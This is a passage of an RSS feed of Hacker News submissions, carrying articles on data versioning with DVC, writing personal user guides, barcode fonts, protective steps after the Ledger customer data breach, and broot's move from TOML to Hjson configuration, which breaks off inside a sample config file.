<p>A CDN is a “content delivery network” that puts servers closer to users. There’s your “origin server”, that’s the one you deployed somewhere, and then a bunch of CDN servers that your visitors browsers actually talk to.</p>

<p>Not only does the CDN put your website closer geographically to the user, but it also lets you skip hitting your server to build dynamic pages for as long as you specify in max-age.</p>

<p>And that wraps it up for this article. Feel free to leave your feedback or questions in the comments section.</p>


	
	
</div></div>]]>
            </description>
            <link>https://adnanahmed.info/blog/2020/12/20/http-caching/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506495</guid>
            <pubDate>Tue, 22 Dec 2020 14:23:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Bugs and How to Fix Them]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506421">thread link</a>) | @edameme
<br/>
December 22, 2020 | https://dagshub.com/blog/data-bugs-how-to-fix-them/ | <a href="https://web.archive.org/web/*/https://dagshub.com/blog/data-bugs-how-to-fix-them/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>As data scientists know from painful experience, bugs in the code usually aren't the big difficult problem. Data itself contains bugs, in the terms of the classic definition of bugs - unexpected behaviors, usually resulting from mistaken assumptions.</p><p>In this post, I'd like to share my personal story of a data bug, which is very indicative of the types of bugs you will come across in data science work.</p><p>At DAGsHub, we're creating tools to make these bugs easier to fix. I'll show how I applied these tools in this concrete case. Fixing data bugs is a challenging process and the tools aren't as amazing as we believe they could be. <em><strong>We're on it though! </strong></em>😉</p><h2 id="background"><strong>Background</strong></h2><p>The first tutorial we made for DAGsHub was a “standard” MNIST tutorial.</p><p>It was nice and simple - maybe too simple! A lot of users remarked that they're sick and tired of MNIST tutorials, that they don't represent reality at all - the data is already clean, balanced, labeled, and uniform. It's just straight-up images. Seeing an MNIST tutorial immediately puts them off since they feel you can make anything look good with MNIST, whether it's actually good or not.</p><p>So, we decided to create a new tutorial, based on real-world data. We decided to use the StackExchange API to generate a CSV file consisting of data from a lot of questions, specifically from CrossValidated which deals with questions about statistics. The questions include both text and tabular metadata. The label to predict was "is this tagged as a machine learning question or not?", which you can easily imagine as either a recommender system for the user writing the question or an engineered feature used in some backend BI or automation. The labels were also very unbalanced, with only 10% positive labels.</p><p>In short, this new tutorial represented reality much more faithfully than MNIST.</p><h2 id="the-problem"><strong>The problem</strong></h2><p>When I generated the original data, I didn't think about sorting by date - I just <strong>mistakenly assumed</strong> that I'll get back all the questions from the site's history or the latest questions. Oops. I think we've all been there at some point.</p><p>What I ended up getting is 50,000 samples, the upper limit of what the API is willing to return. Worse yet, the samples were not well distributed across time! If it had been a uniformly random selection, that would have been better. But I wasn't even that lucky. I don't know what weird sampling resulted in the time distribution that I actually got:</p><figure><img src="https://dagshub.com/blog/content/images/2020/12/compare_old_and_new_data-copy.png" alt="Comparing data distribution before and after fixing the data bug" srcset="https://dagshub.com/blog/content/images/size/w600/2020/12/compare_old_and_new_data-copy.png 600w, https://dagshub.com/blog/content/images/size/w1000/2020/12/compare_old_and_new_data-copy.png 1000w, https://dagshub.com/blog/content/images/size/w1600/2020/12/compare_old_and_new_data-copy.png 1600w, https://dagshub.com/blog/content/images/size/w2400/2020/12/compare_old_and_new_data-copy.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>A data scientist's before and after pic – comparing the data time distributions</figcaption></figure><p>The bottom line - although I successfully built a decent model on top of the data, the data I used was broken. <strong>I had an entirely data related bug, and no change in my code was going to fix it.</strong> I needed to replace the data completely. In other cases, maybe I would have discovered that there is a subset of the data which just needs to be thrown out manually. These kinds of stories are very common in real life.</p><h2 id="what-can-be-done-in-this-scenario-on-github"><strong>What can be done in this scenario on Github?</strong></h2><ul><li><em>Case 1:</em> The data is stored in some external storage, like S3, and a URL to download it is saved as part of the code on Github. In such a case I could go to the bucket and replace the data stored there. However, I would lose the old data, and maybe even worse, I would lose the relationship between the versions of the data and my existing code! Later on, figuring out which versions of my code, experiments, and resulting models originated from the broken data becomes exceedingly difficult. I'm likely to forget, and even if not, what happens when I'm on vacation or leave the company? Whoever tries to pick up my work is set up for failure.</li><li><em>Case 2:</em> What if I create a new version of the data on S3, name it <code>data_v2.csv</code>, and change the URL in my code? Welcome to Versioning Hell:</li></ul><figure><img src="https://lh5.googleusercontent.com/gaeI3db-6IXdHlVZaaTsW_2Sx05ik4VSxpFzgQOu802Qs7z5uZXanuB-_V6Os5Mt_r0bWOpSmLmGpgow_jf1cwCuPq2PQr7bavapBkGT4r2WZgm_5C7Dw1gvfr57zIDflUHz_N6u" alt=""></figure><ul><li><em>Case 3:</em> We use Git-LFS. Git-LFS is an extension to Git that allows you to efficiently version large files. It's not completely a part of Git - things like diffs and merges aren't supported, since it's too expensive to compute them on large data. What's more, you need a specialized server that can handle LFS. Luckily, GitHub does that. Unluckily, there are still problems - the amount of storage you get for your LFS is limited, and it's hardly a full-fledged data storage solution. I would much rather store these large files on some proper cloud storage, and find a convenient way to link them to my Git repo. What's more - GitHub provides very limited information on what has changed when you try to compare versions of these large files. A line-by-line diff is not practical, but I feel like there are more useful things to say than this:</li></ul><figure><img src="https://lh5.googleusercontent.com/RCMx178HiLbE7qxsZzjz1QXgKePFrAzBc6Et-8VKqz3h7ObTG6ykUy349yB-5SKCvb5F44RniDhhu0aq8BfSHmwoOMc7bPYdGVjNzpuQMDRlU3jWBJ1n5d-7WV4ZlsWASPOGXs7A" alt=" Git-LFS Data Diff"><figcaption>Git-LFS Data Diff (The number of modified lines is also not correct - the file is much larger)</figcaption></figure><p>Even if all the above technical issues are solved, there's one human aspect that's completely ignored - what is the impact of changing the data? OK, the file changed, but how does this affect my metrics? Is the data distributed differently now? Do I have visualizations I want to see before-and-after? In vanilla Git and Github, I can only meaningfully compare text and a few images.</p><h2 id="what-can-you-do-on-dagshub"><strong>What can you do on DAGsHub?</strong></h2><p>We rely on <a href="https://dvc.org/">DVC</a> to connect your data files to your Git commits - similar to Git-LFS, but much more flexible, allowing you to store your data on your own cloud storage, and have many other cool data-science specific features.</p><p>DAGsHub lets you see notebooks and intuitive notebook diffs, which help you understand the underlying data, and create a custom visual comparison of data versions. You can also view the contents of some data formats (more coming soon) as an integrated part of the UI. Comparing large datasets is also made possible by our Directory diffing capabilities. Finally, specifically for issues like this, we created <a href="https://dagshub.com/blog/data-science-pull-requests/">Data Science Pull Requests</a>, which lets you perform the same review process for data as you would with code.</p><p>With all these tools in hand, I can now just replace my data file with the new, corrected version, use DVC and Git to commit the new version, and voila! The data is now fixed...</p><p>...Well, almost. I still need to push the data to my remote, otherwise, the project is pretty useless to anyone not in possession of my laptop.</p><h2 id="setting-up-cloud-storage-is-hard"><strong>Setting up cloud storage is hard</strong></h2><p>OK, so now we can get a version-controlled pull request for data, with meaningful data science information to guide decisions. Our data is stored on full-fledged storage with world-scale capacity. Excellent!</p><p>But let's face it - setting up cloud storage is a pain in the neck. Credit cards? IAM? Bucket retention policies? Service accounts?</p><p>Blech 🤢 !</p><p>That's all way too hard. If we want open-source data science to flourish, we have to make it much more accessible. Well-intentioned people will want to help find and fix bugs, but we shouldn't force them to jump through hoops. Friction is a killer of creativity and productivity.</p><p><strong>It should be as easy as git push, and access control should be handled automatically.</strong></p><p>We're working hard at DAGsHub to make that a reality (stay tuned for more).</p><h2 id="summary"><strong>Summary</strong></h2><p>In real life, data is messy, and as much as you need to iterate on the code or the models, you need to iterate on your data and annotations. Reverting to old-school versioning hell is not a solution. Data should be treated as source code with its versions managed, and fixes to data should undergo the same review process that everything else does. More than that - to enable real open source, I want <strong><em>anyone</em></strong> to be able to contribute fixes to my data.<br></p>
                <section>
                  
                  <ul>
                      <li>
                        <a href="https://dagshub.com/blog/tag/collaboration/" title="Collaboration">Collaboration</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/data-science/" title="Data Science">Data Science</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/dvc/" title="DVC">DVC</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/open-source-data-science/" title="Open Source Data Science">Open Source Data Science</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/data-science-workflow/" title="Data Science Workflow">Data Science Workflow</a>
                      </li>
                  </ul>
                </section>
            </div></div>]]>
            </description>
            <link>https://dagshub.com/blog/data-bugs-how-to-fix-them/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506421</guid>
            <pubDate>Tue, 22 Dec 2020 14:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Captionz – Browse YouTube Videos Using Their Captions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506398">thread link</a>) | @indit
<br/>
December 22, 2020 | https://pnlpal.dev/captionz | <a href="https://web.archive.org/web/*/https://pnlpal.dev/captionz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
	
	

	<main id="panel">
		
		<!-- /.container#content -->
	</main>
	
	

	<div component="toaster/tray">
		<div id="reconnect-alert" component="toaster/toast">
			<p>Looks like your connection to pnlpal was lost, please wait while we try to reconnect.</p>
		</div>
	</div>
	

	

	








</div>]]>
            </description>
            <link>https://pnlpal.dev/captionz</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506398</guid>
            <pubDate>Tue, 22 Dec 2020 14:11:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Should Write a User Guide]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 41 (<a href="https://news.ycombinator.com/item?id=25506371">thread link</a>) | @opsgal
<br/>
December 22, 2020 | https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Decisions have always been hard for me, especially when I'm overwhelmed. For example, I break down in front of restaurants because I can't decide if I want to go in or pick a different restaurant.&nbsp;</span></p>
<p><span>Between working remotely and social distancing, I have spent a lot of time alone this year. The hardest part is needing to make way more decisions for myself. I have to decide when to get up, what to eat, what to work on, and what to do with my free time. Sure, these were largely in my control before, but I relied a lot on social pressure to choose.</span></p>
<p><span>When I was researching </span><a href="https://www.linkedin.com/in/aslawrence/" rel="follow noopener" target="_blank"><span>Adam</span></a><span> for </span><a href="https://boringstartupstuff.com/newsletter/dec-8th-2020-mastering-the-art-of-the-playbook" rel="follow noopener" target="_blank"><span>our interview</span></a><span>, I found his user guide </span><span></span><span>and decided to write one for myself. Both his and the one from the original </span><a href="https://firstround.com/review/the-indispensable-document-for-the-modern-manager/" rel="follow noopener" target="_blank"><span>First Round Review piece</span></a><span> are written from the perspective of a manager, but user guides can be just as helpful for individual contributors. The point is sharing how best to work with you, which is especially important at a time when fewer teams are in-person.&nbsp;</span></p>
<p><span>I created a template (</span><a href="https://www.notion.so/thekatieharper/User-Guide-Outline-e3130055035b455bab61c5400e96e66c" rel="follow noopener" target="_blank"><span>which you can copy here</span></a><span>) and then got stuck. Every bullet point represents a decision that I need to make about myself. My startup job requires me to make decisions constantly, and I actually enjoy that process. But I feel entirely different when it’s a personal decision.&nbsp;</span></p>
<p><span>User guides are essentially a branding exercise, and I worry that I will get called a liar for my choices. I brand myself as a morning person, a proactive doer, and a workaholic. But I’m writing this at night, at the last minute, having spent all weekend </span><i><span>not</span></i><span> working (though also somehow not relaxing). Are my stories based on truth or aspiration?</span></p>
<p><span>Decisions also open us up to rejection. By listing my preferences, personality traits, and pet peeves, I’m publishing a quick way to judge me. What if someone sees this and doesn’t want to work with me?</span></p>
<p><span>Often decisions feel selfish to me. When I decide what time of day I prefer meetings, I feel guilty for prioritizing my own wants over someone else’s. Writing a user guide forces you to confront the stories you tell about yourself. And you have to be vulnerable enough that people will actually learn something useful from reading what you write.&nbsp;</span></p>
<p><span>A year ago I was in a relationship with someone who never decided anything. Now I see that </span><i><span>not</span></i><span> deciding was selfish. And I don’t want to be that way.&nbsp;</span></p>
<p><span>In the end, this piece is my user guide, because it says more about me than a checklist can.</span></p>

</div></div>]]>
            </description>
            <link>https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506371</guid>
            <pubDate>Tue, 22 Dec 2020 14:08:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libre Barcode Project]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25506298">thread link</a>) | @arthur2e5
<br/>
December 22, 2020 | https://graphicore.github.io/librebarcode/ | <a href="https://web.archive.org/web/*/https://graphicore.github.io/librebarcode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        

<p>Libre Barcode fonts enable you to write barcodes in the</p>

<ul>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/code39">Code 39</a>,</li>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/code128">Code 128</a>, and</li>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/ean13">EAN/UPC</a></li>
</ul>

<p>formats, with or without text below the code. Visit the individual pages
for usage instructions and further information.</p>

<hr>
<p>The Code 128 Encoder is historically located at this URL and it stays here
to not break existing links to it. It is also included in the <a href="https://graphicore.github.io/librebarcode/documentation/code128#code128encoder">Code 128</a>
page.</p>

<h2 id="code-128-encoder"><a name="code128encoder">Code 128 Encoder</a></h2>

<p><label>Enter a text: </label></p>

<p>If it can be encoded with Code&nbsp;128 you will see a scannable barcode,
rendered with the <strong>Libre Barcode 128 Text</strong> font.</p>



<p><label> Copy the encoded text to use it with one of the <a href="https://fonts.google.com/?query=Libre+Barcode+128">Libre&nbsp;Barcode&nbsp;128&nbsp;fonts</a>:<br>
</label></p>


      </div>
    </div></div>]]>
            </description>
            <link>https://graphicore.github.io/librebarcode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506298</guid>
            <pubDate>Tue, 22 Dec 2020 13:58:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to React to the Ledger Data Breach]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506289">thread link</a>) | @crecker
<br/>
December 22, 2020 | https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1 | <a href="https://web.archive.org/web/*/https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/ledger/ledger_breach.png" alt="Ledger Data Breach"></p><p><em>Post being continuously updated</em>.</p><p>If you think you are amongst the users affected by the latest <a href="https://ledger.com/">Ledger</a> data breach, it is important <strong>not to panic!</strong> Follow a few simple steps and you can check the extent of the damage and keep an eye on the security of your account.</p><h2 id="what-are-data-breaches">What are Data Breaches?</h2><p>One of the unfortunate side effects of the modern, Internet-connected world is the <a href="https://en.wikipedia.org/wiki/Data_breach">data breach</a> ― an uncontrolled leak of data and/or information. Very often is the case that you (the user) are not responsible for, or the cause of, such an intrusion. Companies have suffered (and will continue to suffer) embarrassing data breaches, whether it takes the form of server breaches, human error, or staff misconduct.</p><p>This information can range from usernames and passwords to tax IDs, physical addresses, and even payment details. These lists are then generally sold online to criminal groups who seek to use this information for profit.</p><h2 id="exploring-the-ledger-data-breach">Exploring the Ledger Data Breach</h2><p>I have already written about the <a href="https://serhack.me/articles/practical-analysis-ledger-phishing-email/">massive phishing campaign</a> that has been going on since early September 2020. However, it was only a matter of time before the attackers sold the database with over 1,000,000 email addresses.</p><p><img src="https://serhack.me/images/ledger/forum_breach.png" alt=""></p><p>The database containing the personal information of over 270,000 Ledger customers has been posted on RaidForums, a marketplace for buying, selling, and sharing information stolen from computer systems. It appears that the buying and selling is actually the result of a purchase on another forum by user <code>Burgulema111</code>.</p><p>The data leak includes two parts:</p><ul><li>The database containing the emails, personal addresses, and phone numbers of Ledger hardware wallet buyers (most likely obtained from a Shopify interface); and</li><li>A list of <strong>over 1 million</strong> emails from Ledger’s marketing campaign.</li></ul><p>Syntax of the DB file:</p><pre><code>[email]| [name_surname]| [address]| [city]| [state]| [mobile_phone]
</code></pre><h2 id="recommendations-to-follow">Recommendations to follow</h2><p>Below, I recommend 5 (+1) actions to take after such a large data breach:</p><h3 id="1-dont-send-your-seed">1. Don’t Send Your Seed!</h3><p>Whenever you are asked (especially in an unsolicited manner), do not reveal or send your seed to ANYONE. <strong>NEVER SEND YOUR SEED!</strong> Even if you think it is the CEO of Ledger himself: DO. NOT. DO. IT. A seed is a collection of 24 random words needed to retrieve the private key to your wallet. Revealing or sending this to anyone is analogous to telling someone the combination to your online safe.</p><p>Your funds are NEVER in danger if you follow common sense, which is to NEVER send or reveal your seed! Ignore emails that come to you about a detected, urgent security issue or an unverified account. If your email is on the list, consider it compromised.</p><h3 id="2-check-what-personal-data-they-have-stolen">2. Check What Personal Data They Have Stolen</h3><p>Through <a href="https://haveibeenpwned.com/">Have I Been Pwned</a> and <a href="https://intelx.io/?did=0b6c44ff-0c94-46c4-b8ad-b7cb762ba5c6">IntelX</a>, you should be able to search for your personal email address. This allows you to check whether or not, in addition to your email address, your personal address or your cell phone number has also been stolen.</p><p>By checking stolen personal information, you should be able to keep track of how much of your personal information has been disclosed and take subsequent countermeasures.</p><h3 id="3-consider-changing-your-email-address-andor-phone">3. Consider Changing Your Email address and/or Phone</h3><p>Once your email address is online, you will get lots of emails. Lists, such as Ledger’s, are recycled by spammers and attackers to create massive spam and phishing marketing campaigns. You should consider that email account compromised and, resultantly, you should open emails you receive very carefully! Even if it seems to you that the recipient may be trusted.</p><p>If you find that your primary email address is in the database, it is a good idea to change email accounts. While you might think that simply abandoning your old, compromised email address and updating your social accounts to the new email address that you have created would help, you might want to think twice. There is the risk that email providers can delete the email account and then there could eventually be an account takeover. So, do not completely abandon your old email address when changing the email address of your social accounts to your new email. While we are on the topic, it would make sense to change your password(s).</p><p>To change your cell phone, the procedure is a bit more complex. You could opt to buy a new data SIM and use it for your main accounts (bank, insurance, etc.). Another approach would be to change your mobile number, but there could be risks associated with this. In the first days, since the operation takes time and if you mess up, you risk finding your account blocked, because they often send a recovery SMS to your old number. In the future there is risk, because it is possible that the previously used mobile number will be recycled and assigned to another person.</p><p>Ultimately, be suspicious of any calls and emails you receive. After data breaches, phishing activity often occurs as criminals hope to take advantage of consumer fear and confusion.</p><h3 id="4-constantly-monitor-accounts">4. Constantly Monitor Accounts</h3><p>While you may think you are “immune” to these threats, closely monitor all of your email, social, and banking accounts. Attackers often use social engineering to steal your identity in addition to sending phishing campaigns. Warn acquaintances and colleagues who may be receiving calls on your behalf and be sure to make them aware that they should not trust the individual(s) reaching out to them.</p><p>You should monitor any changes to your medical and insurance accounts. In addition, it is important to keep an eye on your financial and credit accounts. Identity thieves may have enough sensitive information to use your existing accounts or create new ones in your name.</p><p>If you think that your data has been used for crimes, report it immediately to federal, state, or local law enforcement!</p><h3 id="5-never-pay-ransoms-or-anything-else">5. Never pay ransoms or anything else!</h3><p>If you ever receive an email that threatens you and subsequently asks for a ransom, never pay them. If you think you are in danger and fear for your physical safety, please contact your local authorities right away.</p><p><img src="https://serhack.me/images/ledger/riscatto.png" alt=""></p><h3 id="6-prevent-it-from-happening-to-you-again">6. Prevent it from happening to you again!</h3><p>This current situation is truly alarming and it should be used as a lesson and a warning for the future. Undoubtedly, there will be many people asking themselves, “How can I prevent this from happening again?” It is important to remember that while the company is to blame for this leak, it can also highlight a growing problem with regard to privacy protections. That is: How can you prevent this type of information (email address, home address, and cell phone) from getting into the wrong hands?</p><p>It is of the utmost importance that before doing simple things like making an online purchase or signing up for a social platform, that you read the tedious and bureaucratic Privacy Policy and Terms of Service. This way, you will be able to understand what data is collected and for what purpose it is used. If these disclosures are missing, it would already be a red flag.</p><p><em>I’m not affiliated with Ledger and I’m not taking any parts of the company. I just wanted to write the paragraph to wonder you how much information someone collects.</em></p><p><em>Let me know what you think, <a href="mailto:hi@serhack.me">contact me now</a>!</em></p><hr><h3 id="some-statistical-information">Some statistical information</h3><p>Table of email domains found in the data breach:</p><table><thead><tr><th>Domain</th><th>Number of occurrences found</th></tr></thead><tbody><tr><td>gmail.com</td><td>587.545</td></tr><tr><td>yahoo.com</td><td>62.630</td></tr><tr><td>outlook.com</td><td>14.794</td></tr><tr><td>protonmail.com</td><td>13.120</td></tr><tr><td>yandex.ru</td><td>4.865</td></tr><tr><td>tutanota.com</td><td>634</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>Major states present:</p><table><thead><tr><th>States</th><th>Number of occurrences found</th></tr></thead><tbody><tr><td>United States</td><td>91.442</td></tr><tr><td>Germany</td><td>23.519</td></tr><tr><td>United Kingdom</td><td>21.130</td></tr><tr><td>France</td><td>17.263</td></tr><tr><td>Canada</td><td>12.730</td></tr><tr><td>Italy</td><td>5.672</td></tr><tr><td>Russia</td><td>4.953</td></tr><tr><td>Denmark</td><td>1.670</td></tr></tbody></table></div></div>]]>
            </description>
            <link>https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506289</guid>
            <pubDate>Tue, 22 Dec 2020 13:57:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why broot is switching from TOML to Hjson for its configuration files]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505892">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://dystroy.org/blog/hjson-in-broot/ | <a href="https://web.archive.org/web/*/https://dystroy.org/blog/hjson-in-broot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>TOML was originally the only format for configuring broot.</p>
<p>Here I explain why Hjson is now the preferred one.</p>
<h2 id="why-i-started-with-toml">Why I started with TOML</h2>
<p>The reasons I chose <a href="https://github.com/toml-lang/toml">TOML</a> when I started working on <a href="https://github.com/Canop/broot">broot</a> may be familiar to many devs:</p>
<ul>
<li>all ancient configuration formats were already known to be flawed</li>
<li>it had "obvious" in the name so it was simple, right ?</li>
<li>it did look quite simple even if the <code>[[item]]</code> thing was a little puzzling</li>
<li>many of the usual problems of other formats weren't present (more on this later)</li>
<li>it was quite popular in the Rust world, since it had been chosen for cargo configuration</li>
<li>the deserialization tooling in Rust was very good</li>
</ul>
<p>The result in broot is it was quite OK and could accommodate the rich configuration of Broot.</p>
<p>It's still usable and I expect to keep it as an alternate format.</p>
<h2 id="the-problems-with-toml">The problems with TOML</h2>
<p>Most users still consider the language alien and confusing, the structure of a big and structured configuration doesn't clearly appear, and I've had too many reports of users not understanding why the line they added was ignored.</p>
<p>Here's an exemple of a case which puzzles users. <code>chars</code> is an array of items:</p>
<pre><code><span>[[chars]]
name = "A"
value = 10

[[chars]]
name = "B"
value = 11

prop = 3
</span></code></pre>
<p>What the user wanted here, when adding the last <code>prop</code>, was to set a top level property.</p>
<p>But what really happens is that the property is added to the second item of the <code>"chars"</code> array. It's kind of easy to spot in this short example, especially when you're used to TOML, but it's not at all in a big file.</p>
<p>The workaround here would be to put simple properties before the array but that's not how humans work.</p>
<p>Adding a line to a configuration file is something that linux users do all the time.</p>
<p>People who’ve been told that to achieve an effect they would have to add this line in their config.toml file won’t read the whole file to scan whether there’s a better location, they’re used to add it at the end as they do for example in their .bashrc file. Of course, coming back later they would probably try to organize everything but they won’t because their first reaction is that there’s a bug in the application since the added line did nothing.</p>
<p>Such traps aren't really OK when you're configuring a program, especially if you just touch the file occasionnally and don't want to be an expert in it.</p>
<p>So it seemed reasonable to switch to another format but, just like there's no <em>obvious</em> format, there's no <em>obvious</em> choice. Let's review them a little.</p>
<h2 id="what-s-a-configuration-file">What's a configuration file ?</h2>
<p>The patterns we use have quite settled and the model I describe here is about universal now.</p>
<p>For the program which reads it, a configuration file contains a <code>value</code>.</p>
<p>A <code>value</code> is either</p>
<ul>
<li>a string</li>
<li>a number -- a more precise taxonomy here is useful</li>
<li>a boolean -- we can deal without it but it's clearer</li>
<li>a list of values -- also called sequence, array, etc.</li>
<li>a map of keys (strings) to values -- such a map is often used as a "structured object"</li>
<li>the absence of a value -- which is especially important to fall back to a default</li>
</ul>
<p>But before to be read by a program, a configuration file is written by a human, it's read and modified by other humans. So there's much more to it.</p>
<p>First you need comments. There's no way around that.
The purpose of a value, its syntax and meaning, must be explained.
And comments are useful too to disable a setting, either temporarily or because it's here as an example.</p>
<p>Then you need the structure to be clear, the format not to push you towards errors.</p>
<p>You want users to be able to change values without reading everything.</p>
<p>And, unless your configuration structure is very small and guaranteed frozen, you want your users to be able to <em>add</em> properties.</p>
<p>And you'd rather have not too many meaningless characters to add to explain your meaning to the program (I won't even speak of XML...).</p>
<p>As we're in 2020 I'll consider UTF-8 as a given.</p>
<p>So let's look at the offering.</p>
<h2 id="usual-configuration-formats">Usual Configuration Formats</h2>
<p>Here's a list of more or less common file formats, with their advantages and problems as configuration formats.</p>
<h3 id="ini">INI</h3>
<p><a href="https://en.wikipedia.org/wiki/INI_file">INI files</a> are cool if you want to set a few properties but there's no real solution for anything deeply structured in those files.
So you always find yourself forced to migrate for something more serious.</p>
<h3 id="json">JSON</h3>
<p><a href="https://www.json.org/json-en.html">JSON</a> is ubiquitous as a data exchange format, with files that humans can read and even create or modify.</p>
<p>It generates few errors by itself and is quite clear.</p>
<p>It maps very well to program structures, and the tooling is abundant and good.</p>
<p>It has a few problems for our purpose, though:</p>
<ul>
<li>it lacks comments. In my opinion this is enough to make it unsuitable as a configuration format despite the fact it's a frequent choice</li>
<li>you can't have trailing commas, which means you often modify other lines when you add or remove one</li>
<li>bracing every key with quotes is painful and unnatural</li>
</ul>
<h3 id="yaml">YAML</h3>
<p><a href="https://en.wikipedia.org/wiki/YAML">YAML</a> is compact, quite clear and has comments.</p>
<p>But its space based syntax makes it prone to errors, makes big structures hard to decipher, and it's occasionally hard to debug the indentation related problems.</p>
<p>And it has this strange weirdness, which may matter or not : Do you know how to tell if you have a quoteless string or a boolean ? Probably not (<code>Off</code> is a boolean, see the regexp <a href="https://yaml.org/type/bool.html">here</a>).
This last problem can be lifted with the <a href="https://hitchdev.com/strictyaml/">Strict YAML</a> variant, though.
And it doesn't matter when you deserialize into the types required by the program's structure instead of applying the format typing rules.</p>
<h3 id="toml">TOML</h3>
<p>Coming after INI, JSON and YAML, TOML solves some of their problems.</p>
<p>It has comments, doesn't make you count invisible chars or put quotes everywhere.</p>
<p>And it has quite a good support for structured data...</p>
<p>Except lists of objects.</p>
<p>I already showed an example of problem but any deep configuration is a problem in TOML.</p>
<p>And nobody seems to understand what's really the syntax and how a human should parse it.</p>
<p>In my opinion this language should be reserved to when the structure is small and mostly frozen.</p>
<h3 id="hjson">Hjson</h3>
<p><a href="https://hjson.github.io/">Hjson</a> has a very limited purpose compared to other formats. It's not a normal serialization formats.
It's not meant to be written by programs: it's meant to be written by humans, read and modified by other humans, then read by programs. It has been from the start designed for this purpose which makes it suit configuration needs.</p>
<p>The tooling today for Hjson is far behind the one of the other formats I mentioned.</p>
<p>Most parsers or deserializers are really just converting with JSON (yes there's a big overhead).</p>
<p>For Rust, as I wanted a Serde <code>derive</code> guided deserialization, I had to write the <a href="https://github.com/Canop/deser-hjson">deserializer</a> myself (it's probably still buggy at this point).</p>
<p>In another case of Hjson being behind in tooling, in order for the blog example below to be clear, I had to select "CSS" as format for the style parser.</p>
<p>But Hjson, while not perfect, is much better than the other configuration formats of today for most applications:</p>
<ul>
<li>It's clear and almost "obvious"</li>
<li>It's already familiar, especially when dealing with lists and maps</li>
<li>There are less traps</li>
<li>You don't usually have to deal with escape sequences thanks to quoteless strings</li>
<li>There are facilities for multiline strings</li>
<li>You can have trailing commas, or no commas</li>
</ul>
<p>The whole file will be wrapped betwen braces, this isn't pretty, but that's a minor point. Another (small?) problem is that you may have a little too much indentation when dealing with deep structures.</p>
<p>A trap I found was about quoteless strings: The rule may be not obvious, especially the fact that a quoteless string can't start with a colon. A least the error is usually not silent here but I'd still recommend to avoid quoteless strings when surprising strings are expected (meaning you should then use a classical quoted string).</p>
<p>Note that some other formats went the same direction, but not so far:</p>
<ul>
<li><a href="https://json5.org/">JSON5</a> which fixes some shortcomings of JSON while still being more a general purpose or data exchange format than one really focused on human writing and use in configuration</li>
<li><a href="https://rome.tools/#rome-json">Rome Json</a> which does some of the changes Hjson does</li>
</ul>
<p>All in one I find this format to be less bad than the other ones and I expect to be more convincing with an example.</p>
<h3 id="example">Example</h3>
<p>Here's the current complete default configuration of broot:</p>
<pre><code><span>###############################################################
# This configuration file lets you
# - define new commands
# - change the shortcut or triggering keys of </span><span>built-in</span><span> verbs
# - change the colors
# - set default values for flags
# - set special behaviors on specific paths
# - and more...
#
# Configuration documentation is available at
#     https:</span><span>//</span><span>dystroy</span><span>.</span><span>org</span><span>/</span><span>broot
#
# This file'</span><span>s</span><span> format is Hjson ( https:</span><span>//</span><span>hjson</span><span>.</span><span>github</span><span>.</span><span>io</span><span>/ )
</span><span>#
###############################################################
</span><span>{

	###############################################################
	# Default flags
	# You can set up flags you want broot to start with by
	# default, for example `default_flags="ihp"` if you usually want
	# to see hidden and gitignored files and the permissions (then
	# if you don't want the hidden files you can launch `br -H`)
	# A popular flag is the `g` one which displays git related info.
	#
	# default_flags:

	###############################################################
	# Date/Time format
	# If you want to change the format for date/time, uncomment the
	# following line and change it according to
	# https://docs.rs/chrono/</span><span>0.4.11</span><span>/chrono/format/strftime/index.html
	#
	# date_time_format: %Y/%m/%d %R

	###############################################################
	# Whether to mark the selected line with a triangle
	#
